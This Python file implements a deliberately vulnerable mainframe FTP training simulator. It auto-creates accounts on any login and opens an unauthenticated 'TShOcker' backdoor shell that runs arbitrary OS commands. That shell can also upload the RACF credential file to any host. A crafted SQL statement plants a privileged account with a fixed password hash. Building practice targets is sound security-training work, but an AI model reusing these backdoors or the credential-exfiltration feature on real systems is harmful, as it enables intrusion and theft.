#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GIBSONFTP and TOOLS upgrade - Training Simulator (clean consolidated build)
- FTP server with FILE/JES/SQL modes
- Per-user roots at ~/mfsim/f/<USER>
- TShOcker backdoor for JES jobs (5-minute TTL)
- SQL uploads generate DB2-like outputs (JOB*.txt) + SARCHER side-effect
- Robust PASV/EPSV handling, safe path joins, and improved logging
"""

import base64
import datetime
import io
import logging
import os
import socket
import socketserver
import subprocess
import threading
import time
import traceback
from typing import Optional, Tuple

# ---------------- Configuration ----------------
LISTEN_HOST = os.environ.get("GIBSON_LISTEN_HOST", "0.0.0.0")
LISTEN_PORT = int(os.environ.get("GIBSON_LISTEN_PORT", "2111"))  # per request

SIM_ROOT = os.path.expanduser(os.environ.get("GIBSON_SIM_ROOT", "~/mfsim"))
FILES_ROOT = os.path.join(SIM_ROOT, "f")
DB_PATH = os.path.join(SIM_ROOT, "GACF.DB")
SYS1_RACFDS_PATH = os.path.join(FILES_ROOT, "SYS1.RACFDS")

TSHOCKER_BIND = os.environ.get("TSHOCKER_BIND", "0.0.0.0")
TSHOCKER_TTL = int(os.environ.get("TSHOCKER_TTL", "300"))  # 5 minutes

DATA_ACCEPT_TIMEOUT = 15

# Ensure required directories exist
os.makedirs(FILES_ROOT, exist_ok=True)
if not os.path.exists(DB_PATH):
    with open(DB_PATH, "a", encoding="utf-8"):
        pass

# ---------------- Logging ----------------
logger = logging.getLogger("GIBSONFTP")
logger.setLevel(logging.INFO)
_handler = logging.StreamHandler()
_handler.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(threadName)s %(name)s: %(message)s",
                                        datefmt="%Y-%m-%d %H:%M:%S"))
logger.addHandler(_handler)

# ---------------- Shared state/locks ----------------
USERS_LOCK = threading.RLock()
ACTIVE_JOBS_LOCK = threading.RLock()

# ---------------- Users DB helpers ----------------
def load_users() -> dict:
    users = {}
    with USERS_LOCK:
        if os.path.exists(DB_PATH):
            with open(DB_PATH, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    parts = line.split(":")
                    if len(parts) >= 2:
                        user = parts[0]
                        password = parts[1]
                        attrs = parts[2:] if len(parts) > 2 else []
                        users[user] = (password, attrs)
    return users

def write_users(users: dict) -> None:
    with USERS_LOCK:
        with open(DB_PATH, "w", encoding="utf-8") as f:
            for user, (pw, attrs) in users.items():
                line = [user, pw] + attrs
                f.write(":".join(line) + "\n")

USERS = load_users()

def per_user_root(username: str) -> str:
    root = os.path.join(FILES_ROOT, username)
    os.makedirs(root, exist_ok=True)
    return root

def safe_join(base: str, *paths: str) -> str:
    new_path = os.path.abspath(os.path.join(base, *paths))
    base_abs = os.path.abspath(base)
    if not (new_path == base_abs or new_path.startswith(base_abs + os.sep)):
        raise ValueError("Path escapes base")
    return new_path

def get_pasv_ip(sock: socket.socket) -> str:
    try:
        ip = sock.getsockname()[0]
        if ip and ip not in ("0.0.0.0", "::"):
            return ip
    except Exception:
        pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

# ---------------- Password verification ----------------
def _b64(s: str) -> str:
    try:
        return base64.b64encode(s.encode("utf-8")).decode("ascii")
    except Exception:
        return ""

def _b64_decode(s: str) -> str:
    try:
        return base64.b64decode(s.encode("ascii")).decode("utf-8")
    except Exception:
        return ""

def verify_password(stored: str, supplied: str) -> bool:
    # Plaintext
    if stored == supplied:
        return True
    # Base64 variants
    if stored == _b64(supplied):
        return True
    if _b64_decode(stored) == supplied:
        return True
    # crypt() hashes ($1$/$5$/$6$) on Unix
    try:
        import crypt  # type: ignore
        if stored.startswith(("$1$", "$5$", "$6$")):
            return crypt.crypt(supplied, stored) == stored
    except Exception:
        pass
    return False

# ---------------- TShOcker ----------------
class TShOckerHandler(socketserver.StreamRequestHandler):
    root_cwd = os.path.expanduser("~")

    def sendln(self, msg: str = ""):
        try:
            self.wfile.write((msg + "\n").encode("utf-8", errors="ignore"))
            self.wfile.flush()
        except Exception:
            pass

    def handle(self):
        peer = self.client_address
        logger.info(f"TShOcker connection from {peer}")
        self.cwd = self.root_cwd
        self.sendln("Welcome to TShOcker (training shell). Type 'help'.")
        while True:
            self.sendln("tsh> ")
            line = self.rfile.readline()
            if not line:
                break
            cmdline = line.decode("utf-8", errors="ignore").strip()
            if not cmdline:
                continue
            parts = cmdline.split()
            cmd = parts[0].lower()

            if cmd in ("quit", "exit"):
                self.sendln("bye.")
                break

            if cmd == "help":
                self.sendln("Commands: help, unix <cmd...>, pwd, cd <dir>, dir, racf, ftp_racf <host> <port> <user> <pass> [destname]")
                self.sendln("Note: ftp_racf uploads SYS1.RACFDS from ~/mfsim/f/ to the target via FTP STOR.")
                continue

            if cmd == "pwd":
                self.sendln(self.cwd)
                continue

            if cmd == "cd":
                if len(parts) >= 2:
                    try:
                        newdir = os.path.abspath(os.path.join(self.cwd, " ".join(parts[1:])))
                        if os.path.isdir(newdir):
                            self.cwd = newdir
                        else:
                            self.sendln("not a directory")
                    except Exception as e:
                        self.sendln(f"cd error: {e}")
                else:
                    self.sendln("usage: cd <dir>")
                continue

            if cmd == "dir":
                try:
                    for e in os.listdir(self.cwd):
                        self.sendln(e)
                except Exception as e:
                    self.sendln(f"dir error: {e}")
                continue

            if cmd == "racf":
                self.sendln(f"SYS1.RACFDS: {SYS1_RACFDS_PATH}")
                self.sendln(f"GACF.DB    : {DB_PATH}")
                self.sendln("")
                self.sendln("RACFDB for training but either can be offloaded and cracked. :)")
                continue

            if cmd == "ftp_racf":
                # ftp_racf <host> <port> <user> <pass> [destname]
                if len(parts) < 5:
                    self.sendln("usage: ftp_racf <host> <port> <user> <pass> [destname]")
                    continue
                host = parts[1]
                try:
                    port = int(parts[2])
                except ValueError:
                    self.sendln("port must be an integer")
                    continue
                user = parts[3]
                passwd = parts[4]
                destname = parts[5] if len(parts) >= 6 else "SYS1.RACFDS"
                if not os.path.exists(SYS1_RACFDS_PATH):
                    self.sendln(f"source not found: {SYS1_RACFDS_PATH}")
                    continue
                try:
                    import ftplib
                    self.sendln(f"Connecting to {host}:{port} as {user} ...")
                    with ftplib.FTP() as ftp:
                        ftp.connect(host, port, timeout=15)
                        ftp.login(user, passwd)
                        ftp.voidcmd("TYPE I")
                        with open(SYS1_RACFDS_PATH, "rb") as f:
                            ftp.storbinary(f"STOR {destname}", f)
                    self.sendln("Upload complete.")
                except Exception as e:
                    self.sendln(f"ftp_racf error: {e}")
                continue

            if cmd == "unix":
                if len(parts) < 2:
                    self.sendln("usage: unix <command-and-args>")
                    continue
                try:
                    out = subprocess.check_output(parts[1:], cwd=self.cwd, stderr=subprocess.STDOUT, timeout=30)
                    self.sendln(out.decode("utf-8", errors="ignore"))
                except subprocess.CalledProcessError as e:
                    self.sendln(f"rc={e.returncode}\n{e.output.decode('utf-8', errors='ignore')}")
                except Exception as e:
                    self.sendln(f"unix error: {e}")
                continue

            self.sendln("unknown command (try 'help')")

        logger.info(f"TShOcker disconnected {peer}")

class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    daemon_threads = True
    allow_reuse_address = True

def start_tshocker() -> Tuple[ThreadedTCPServer, int]:
    server = ThreadedTCPServer((TSHOCKER_BIND, 0), TShOckerHandler)
    port = server.server_address[1]
    t = threading.Thread(target=server.serve_forever, name=f"TShOcker-{port}", daemon=True)
    t.start()
    logger.info(f"TShOcker listening on {TSHOCKER_BIND}:{port} (auto-closes in {TSHOCKER_TTL}s)")
    def _shutdown():
        try:
            logger.info(f"TShOcker {port} shutting down (TTL expired)")
            server.shutdown()
            server.server_close()
        except Exception:
            pass
    timer = threading.Timer(TSHOCKER_TTL, _shutdown)
    timer.daemon = True
    timer.start()
    return server, port

# ---------------- SQL Simulation ----------------
def _normalize_sql(s: str) -> str:
    return " ".join(s.replace("\r", " ").replace("\n", " ").split()).strip().upper()

def _ensure_sarcher_exact() -> None:
    """Set SARCHER to the exact requested line: SARCHER:$1$UW46ARLk$MJtsT0nRnPwgYGvSRYyiY.:SPECIAL:OMVS"""
    target_hash = "$1$UW46ARLk$MJtsT0nRnPwgYGvSRYyiY."
    with USERS_LOCK:
        users = load_users()
        users["SARCHER"] = (target_hash, ["SPECIAL", "OMVS"])
        write_users(users)
    logger.info(f"SQL(Add-ARCHER): Set SARCHER line to exact training value in {DB_PATH}")

def process_sql(sql_text: bytes) -> tuple[str, str]:
    sql = sql_text.decode("utf-8", errors="ignore")
    norm = _normalize_sql(sql)

    lines = []
    def footer(ok=True):
        if ok:
            lines.append("DSNE601I SQLSTAT = 00000")
            lines.append("DSNE617I DSN UTILITIES STARTED SUCCESSFULLY")
            lines.append("DSNE618I END OF SQL STATEMENT PROCESSING")
        else:
            lines.append("DSNE601I SQLSTAT = 38553")
            lines.append("DSNE617I DSN UTILITIES STARTED WITH WARNINGS")
            lines.append("DSNE618I END OF SQL STATEMENT PROCESSING")

    # 1) INSERT SARCHER SYSADM
    if "INSERT INTO SYSIBM.SYSUSERAUTH" in norm and "SARCHER" in norm:
        outfile = "JOBADD_ARCHER.txt"
        lines.append("DSNE615I NUMBER OF ROWS AFFECTED IS 1")
        lines.append("USERID               AUTHORITY")
        lines.append("SARCHER              SYSADM")
        footer(True)
        try:
            _ensure_sarcher_exact()
        except Exception as e:
            lines.append(f"-- NOTE: Failed to update GACF.DB: {e}")
        lines.append("")
        lines.append("SARCHER added - check default SYSADM password for access.")
        return outfile, "\n".join(lines)

    # 2) WHO HAS SYSADM
    if ("FROM SYSIBM.SYSUSERAUTH" in norm and "AUTHORITY = 'SYSADM'" in norm) or \
       ("FROM SYSIBM.SYSUSERAUTH" in norm and "WHERE SYSADMAUTH = 'Y'" in norm):
        outfile = "JOBWHO_HAS_SYSADM.txt"
        lines.append("DSNE616I NUMBER OF ROWS DISPLAYED IS 2")
        lines.append("USERID               AUTHORITY")
        lines.append("DBAUSER1             SYSADM")
        lines.append("SECUSER2             SYSADM")
        footer(True)
        return outfile, "\n".join(lines)

    # 3) Show basic catalog
    if "FROM SYSIBM.SYSTABLES" in norm:
        outfile = "JOBSHOW_SYSTABLES.txt"
        lines.append("NAME                 CREATOR     TYPE")
        lines.append("SYSTABLES            SYSIBM      T")
        lines.append("SYSUSERAUTH          SYSIBM      V")
        lines.append("SYSINDEXES           SYSIBM      X")
        footer(True)
        return outfile, "\n".join(lines)

    # 4) Generic INSERT
    if norm.startswith("INSERT "):
        outfile = "JOBINSERT_GENERIC.txt"
        lines.append("DSNE615I NUMBER OF ROWS AFFECTED IS 1")
        footer(True)
        return outfile, "\n".join(lines)

    # 5) Generic UPDATE
    if norm.startswith("UPDATE "):
        outfile = "JOBUPDATE_GENERIC.txt"
        lines.append("DSNE615I NUMBER OF ROWS AFFECTED IS 1")
        footer(True)
        return outfile, "\n".join(lines)

    # Fallback
    outfile = "JOBSQL_GENERIC.txt"
    lines.append("-- Statement processed for training; no rows returned")
    footer(True)
    return outfile, "\n".join(lines)

# ---------------- Helpers to detect JES/SQL ----------------
def looks_like_jes(filename: str, body: bytes) -> bool:
    name = (filename or "").lower()
    if name.endswith(".jcl") or name.endswith(".rexx") or name.endswith(".rex") or name.startswith("jcl-"):
        return True
    try:
        txt = body.decode("utf-8", errors="ignore")
    except Exception:
        txt = ""
    u = txt.upper()
    if u.startswith("//") or u.startswith("/* REXX */") or "ADDRESS TSO" in u or "ADDRESS ISPEXEC" in u:
        return True
    if ("//" in u and " EXEC " in u) or ("//" in u and " PROC " in u):
        return True
    return False

def looks_like_sql(filename: str, body: bytes) -> bool:
    try:
        if (filename or "").upper().endswith(".SQL"):
            return True
        u = body.decode("utf-8", errors="ignore").upper()
        if "SELECT" in u or "INSERT" in u or "UPDATE" in u or "SYSIBM" in u:
            return True
    except Exception:
        pass
    return False

# ---------------- FTP Server ----------------
class FTPHandler(socketserver.StreamRequestHandler):
    passive_server: Optional[socket.socket] = None
    passive_addr: Optional[Tuple[str, int]] = None

    def setup(self):
        super().setup()
        self.authed = False
        self.username = None
        self.user_dir = None
        self.cwd = None
        self.filetype = "FILE"
        self.active_jobs = {}
        self.conn_prefix = f"{self.client_address[0]}:{self.client_address[1]}"
        logger.info(f"FTP connection from {self.conn_prefix}")

    def send_response(self, msg: str):
        if not msg.endswith("\r\n"):
            msg += "\r\n"
        try:
            self.wfile.write(msg.encode("utf-8", errors="ignore"))
            self.wfile.flush()
        except Exception:
            pass

    def _accept_data(self) -> Optional[socket.socket]:
        if not self.passive_server:
            self.send_response("425 Use PASV or EPSV first")
            return None
        self.passive_server.settimeout(DATA_ACCEPT_TIMEOUT)
        try:
            conn, addr = self.passive_server.accept()
            logger.info(f"Data connection from {addr}")
            return conn
        except socket.timeout:
            self.send_response("425 Data connection timed out")
            return None
        finally:
            try:
                self.passive_server.close()
            except Exception:
                pass
            self.passive_server = None
            self.passive_addr = None

    def handle(self):
        self.send_response("220 GIBSONFTP ready")
        while True:
            line = self.rfile.readline()
            if not line:
                break
            text = line.decode("utf-8", errors="ignore").strip()
            if not text:
                continue

            upper = text.upper()
            if upper.startswith("PASS "):
                pw = text[5:]
                b64 = base64.b64encode(pw.encode("utf-8")).decode("ascii")
                logger.info(f"{self.conn_prefix} PASS {b64} (BASE64)")
            else:
                logger.info(f"{self.conn_prefix} >> {text}")

            parts = text.split()
            cmd = parts[0].upper()
            arg = text[len(cmd):].strip() if len(parts) > 1 else ""

            try:
                if cmd == "USER":
                    self.handle_USER(arg)
                elif cmd == "PASS":
                    self.handle_PASS(arg)
                elif cmd == "SYST":
                    self.send_response("215 UNIX Type: L8")
                elif cmd == "FEAT":
                    self.handle_FEAT()
                elif cmd == "PWD":
                    self.send_response(f'257 "{self.cwd}" is the current directory')
                elif cmd == "CWD":
                    self.handle_CWD(arg)
                elif cmd == "TYPE":
                    self.send_response("200 Type set")
                elif cmd == "MODE":
                    self.send_response("200 Mode set")
                elif cmd == "STRU":
                    self.send_response("200 Structure set")
                elif cmd == "PASV":
                    self.handle_PASV()
                elif cmd == "EPSV":
                    self.handle_EPSV()
                elif cmd in ("STOR", "PUT"):
                    self.handle_STOR(arg)
                elif cmd == "RETR":
                    self.handle_RETR(arg)
                elif cmd == "LIST":
                    self.handle_LIST(arg)
                elif cmd == "SITE":
                    self.handle_SITE(arg)
                elif cmd == "QUIT":
                    self.send_response("221 Goodbye")
                    break
                else:
                    self.send_response("502 Command not implemented")
            except Exception as e:
                logger.error(f"Error handling {text}: {e}\n{traceback.format_exc()}")
                try:
                    self.send_response("550 Command failed")
                except Exception:
                    pass

        logger.info(f"FTP disconnected {self.conn_prefix}")

    def handle_USER(self, arg: str):
        self.username = arg.split()[0] if arg else ""
        self.send_response("331 Password required")

    def handle_PASS(self, arg: str):
        if self.username is None:
            self.send_response("503 Login with USER first")
            return
        supplied = arg
        ok = False
        with USERS_LOCK:
            global USERS
            if self.username not in USERS:
                USERS[self.username] = (supplied, [])
                write_users(USERS)
                ok = True
            else:
                stored_pw, _attrs = USERS[self.username]
                ok = verify_password(stored_pw, supplied)
        if ok:
            self.authed = True
            self.user_dir = per_user_root(self.username)
            self.cwd = self.user_dir
            self.send_response("230 Login successful")
        else:
            self.send_response("530 Login incorrect")

    def handle_CWD(self, arg: str):
        if not self.authed:
            self.send_response("530 Not logged in"); return
        if not arg:
            self.send_response("550 Failed to change directory"); return
        if os.path.isabs(arg):
            self.send_response("550 Absolute paths not allowed"); return
        try:
            new_dir = safe_join(self.user_dir, arg)
            if os.path.isdir(new_dir):
                self.cwd = new_dir
                self.send_response(f'250 Directory changed to "{self.cwd}"')
            else:
                self.send_response("550 Failed to change directory")
        except Exception:
            self.send_response("550 Failed to change directory")

    def handle_FEAT(self):
        self.send_response("211-Extensions supported:\r\n EPSV\r\n PASV\r\n UTF8\r\n SIZE\r\n211 End")

    def handle_PASV(self):
        if self.passive_server:
            try:
                self.passive_server.close()
            except Exception:
                pass
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((LISTEN_HOST, 0))
        srv.listen(1)
        host_ip = get_pasv_ip(self.request)
        port = srv.getsockname()[1]
        self.passive_server = srv
        self.passive_addr = (host_ip, port)
        p1, p2 = port // 256, port % 256
        hbytes = host_ip.replace(".", ",")
        self.send_response(f"227 Entering Passive Mode ({hbytes},{p1},{p2})")

    def handle_EPSV(self):
        if self.passive_server:
            try:
                self.passive_server.close()
            except Exception:
                pass
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((LISTEN_HOST, 0))
        srv.listen(1)
        host_ip = get_pasv_ip(self.request)
        port = srv.getsockname()[1]
        self.passive_server = srv
        self.passive_addr = (host_ip, port)
        self.send_response(f"229 Entering Extended Passive Mode (|||{port}|)")

    def handle_LIST(self, arg: str):
        if not self.authed:
            self.send_response("530 Not logged in"); return
        self.send_response("150 Opening data connection")
        conn = self._accept_data()
        if not conn:
            return
        try:
            target = self.cwd if not arg else safe_join(self.cwd, arg)
        except Exception:
            target = self.cwd

        def _fmt(path):
            st = os.stat(path)
            mode = "drwxr-xr-x" if os.path.isdir(path) else "-rw-r--r--"
            nlink = 1
            size = st.st_size
            mtime = datetime.datetime.fromtimestamp(st.st_mtime).strftime("%b %d %H:%M")
            name = os.path.basename(path)
            return f"{mode} {nlink} user group {size:8d} {mtime} {name}\r\n"

        try:
            if os.path.isdir(target):
                for name in sorted(os.listdir(target)):
                    conn.sendall(_fmt(os.path.join(target, name)).encode("utf-8"))
            elif os.path.exists(target):
                conn.sendall(_fmt(target).encode("utf-8"))
            self.send_response("226 Directory send OK")
        except Exception:
            self.send_response("451 LIST failed")
        finally:
            try:
                conn.close()
            except Exception:
                pass

    def handle_STOR(self, arg: str):
        if not self.authed:
            self.send_response("530 Not logged in"); return
        if not arg:
            self.send_response("501 STOR requires a pathname"); return
        try:
            filename = os.path.basename(arg)
            target = safe_join(self.cwd, filename)
        except Exception:
            self.send_response("553 Invalid filename"); return

        self.send_response("150 Opening data connection")
        data_conn = self._accept_data()
        if not data_conn:
            return

        buf = io.BytesIO()
        try:
            while True:
                chunk = data_conn.recv(65536)
                if not chunk:
                    break
                buf.write(chunk)
        finally:
            try:
                data_conn.close()
            except Exception:
                pass

        content = buf.getvalue()

        # Determine SQL and JES intent
        is_jes = (self.filetype == "JES") or looks_like_jes(filename, content)
        is_sql = (self.filetype == "SQL") or (looks_like_sql(filename, content) and not is_jes)

        logger.info(f"STOR received: {filename}, FILETYPE={self.filetype}, is_sql={is_sql}, is_jes={is_jes}")

        # --- JES takes priority ---
        
        if is_jes:
            try:
                is_cpracf = (filename.upper() == "CPRACFDB.JCL")
                if is_cpracf:
                    # Authorization: only SPECIAL users allowed
                    try:
                        users = load_users()
                        u_entry = users.get(self.username) or users.get((self.username or "").upper())
                        attrs = u_entry[1] if u_entry else []
                    except Exception:
                        attrs = []
                    if "SPECIAL" not in [a.upper() for a in attrs]:
                        self.send_response("550 RACF NOT AUTHORIZED FOR REQUEST RC=8")
                        return

                    jobid = self._gen_jobid()
                    host_ip = get_pasv_ip(self.request)
                    jobfile_path = os.path.join(self.cwd, jobid)
                    jobcard = f"//{jobid} JOB (ACCT),'{(self.username or 'USER')}',CLASS=A,MSGCLASS=A,MSGLEVEL=(1,1)\n"

                    # Copy SYS1.RACFDS into user's CWD
                    copy_note = ""
                    try:
                        src = SYS1_RACFDS_PATH
                        dst = safe_join(self.cwd, "SYS1.RACFDS")
                        if os.path.exists(src):
                            import shutil
                            shutil.copyfile(src, dst)
                            copy_note = f"Copied SYS1.RACFDS to {dst}\n"
                            logger.info(f"CPRACFDB: copied SYS1.RACFDS -> {dst}")
                        else:
                            copy_note = f"WARNING: Source not found: {src}\n"
                            logger.warning(f"CPRACFDB: source missing: {src}")
                    except Exception as e:
                        copy_note = f"WARNING: Copy failed: {e}\n"
                        logger.error(f"CPRACFDB copy failed: {e}")

                    with open(jobfile_path, "wb") as jf:
                        jf.write(jobcard.encode("utf-8"))
                        jf.write(b"===== JOB SUBMISSION DATA =====\n")
                        jf.write(content)
                        jf.write(b"\n\n")
                        # No backdoor for CPRACFDB; return success msg instead
                        msg = "RACFDB JOB SUCCESS RC=0\n"
                        if copy_note:
                            msg += copy_note
                        jf.write(msg.encode("utf-8"))
                    logger.info(f"JES job created (CPRACFDB) -> {jobid} in {self.cwd}")
                    self.send_response(f"226 {jobid} created; RACFDB JOB SUCCESS RC=0")
                    return

                # Normal JES path (with TShOcker backdoor)
                jobid = self._gen_jobid()
                tsh_server, tsh_port = start_tshocker()
                with ACTIVE_JOBS_LOCK:
                    self.active_jobs[jobid] = {"tsh_server": tsh_server, "tsh_port": tsh_port, "created": time.time()}

                host_ip = get_pasv_ip(self.request)
                jobfile_path = os.path.join(self.cwd, jobid)
                jobcard = f"//{jobid} JOB (ACCT),'{(self.username or 'USER')}',CLASS=A,MSGCLASS=A,MSGLEVEL=(1,1)\n"
                burn = "NOTE: You have 5 minutes to connect before this port is burned.\n"

                # NEW: special CPRACFDB.JCL handling was moved above; remaining JES path continues as before
                # [CPRACFDB_INSERT_HERE]

                with open(jobfile_path, "wb") as jf:
                    jf.write(jobcard.encode("utf-8"))
                    jf.write(b"===== JOB SUBMISSION DATA =====\n")
                    jf.write(content)
                    jf.write(b"\n\n")
                    msg = f"Connect with: ncat {host_ip} {tsh_port}\n{burn}"
                    jf.write(msg.encode("utf-8"))
                logger.info(f"JES job created -> {jobid} in {self.cwd}; TShOcker port {tsh_port}")
                self.send_response(f"226 {jobid} created; TShOcker port announced inside")
                return
            except Exception as e:
                self.send_response("451 JES submit failed")
                logger.error(f"JES failed: {e}")
                return
# --- SQL path ---
        if is_sql:
            try:
                outname, outtext = process_sql(content)
                with open(target, 'wb') as origf:
                    origf.write(content)
                    origf.flush()
                    os.fsync(origf.fileno())
                outpath = safe_join(self.cwd, outname)
                with open(outpath, 'w', encoding='utf-8') as outf:
                    outf.write(outtext)
                    outf.flush()
                    os.fsync(outf.fileno())
                logger.info(f"SQL processed -> {outname} in {self.cwd} (saved original as {filename})")
                self.send_response(f"226 SQL processed; output in {outname}")
                return
            except Exception as e:
                logger.error(f"SQL processing failed: {e}")
                self.send_response("451 SQL processing failed")
                return

        # Normal file upload
        try:
            with open(target, "wb") as f:
                f.write(content)
            self.send_response("226 Transfer complete")
        except Exception as e:
            self.send_response("451 STOR failed")
            logger.error(f"STOR failed: {e}")

    def handle_RETR(self, arg: str):
        if not self.authed:
            self.send_response("530 Not logged in"); return
        try:
            target = safe_join(self.cwd, os.path.basename(arg))
        except Exception:
            self.send_response("550 File unavailable"); return
        if not os.path.exists(target):
            self.send_response("550 File not found"); return
        self.send_response("150 Opening data connection")
        conn = self._accept_data()
        if not conn:
            return
        try:
            with open(target, "rb") as f:
                while True:
                    chunk = f.read(65536)
                    if not chunk:
                        break
                    conn.sendall(chunk)
            try:
                conn.shutdown(socket.SHUT_WR)
            except Exception:
                pass
            self.send_response("226 Transfer complete")
        except Exception as e:
            self.send_response("451 RETR failed")
            logger.error(f"RETR failed: {e}")
        finally:
            try:
                conn.close()
            except Exception:
                pass

    def handle_SITE(self, arg: str):
        opt = arg.strip().upper()
        if opt.startswith("FILETYPE="):
            value = opt.split("=", 1)[1]
            if value in ("FILE", "JES", "SQL"):
                old = getattr(self, "filetype", "FILE")
                self.filetype = value
                try:
                    logger.info(f"SET FILETYPE: {old} -> {self.filetype}")
                except Exception:
                    pass
                self.send_response(f"200 FILETYPE set to {self.filetype}")
            else:
                self.send_response("504 Unknown FILETYPE")
        elif opt.startswith("JES PURGE"):
            parts = opt.split()
            if len(parts) >= 3:
                jobid = parts[2]
                with ACTIVE_JOBS_LOCK:
                    info = self.active_jobs.pop(jobid, None)
                if info and info.get("tsh_server"):
                    try:
                        info["tsh_server"].shutdown()
                        info["tsh_server"].server_close()
                    except Exception:
                        pass
                    self.send_response(f"200 {jobid} purged (TShOcker closed)")
                else:
                    self.send_response("550 Unknown job")
            else:
                self.send_response("501 Usage: SITE JES PURGE <JOBID>")
        else:
            self.send_response("504 Unknown SITE option")

    def _gen_jobid(self) -> str:
        ts = int(time.time() * 1000) % 100000
        return f"JOB{ts:05d}"

# ---------------- Main ----------------
def main():
    with ThreadedTCPServer((LISTEN_HOST, LISTEN_PORT), FTPHandler) as server:
        ip, port = server.server_address
        logger.info(f"GIBSONFTP listening on {ip}:{port}")
        try:
            server.serve_forever(poll_interval=0.5)
        except KeyboardInterrupt:
            logger.info("Shutting down...")
        finally:
            server.shutdown()

if __name__ == "__main__":
    main()
